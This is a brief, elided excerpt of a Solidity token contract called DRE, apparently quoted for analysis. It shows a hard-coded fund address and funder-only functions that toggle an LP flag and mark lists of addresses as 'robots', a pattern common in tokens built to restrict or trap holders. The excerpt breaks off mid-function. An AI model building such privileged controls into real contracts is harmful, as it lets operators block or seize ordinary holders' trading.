...
contract DRE is IERC20, Ownable {
    ...
    constructor (){
        ...
        fundAddress = 0x5B85a6966376C99E7Ef0dF2EFc390AD4d436b39d;
	...
	function setIsLP(bool _value) external onlyFunder {
        isLP = _value;
    }
	...
	function setIsRobot(address[] calldata addList, bool enable) external onlyFunder {
		for(uint256 i = 0; i < addList.length; i++) {
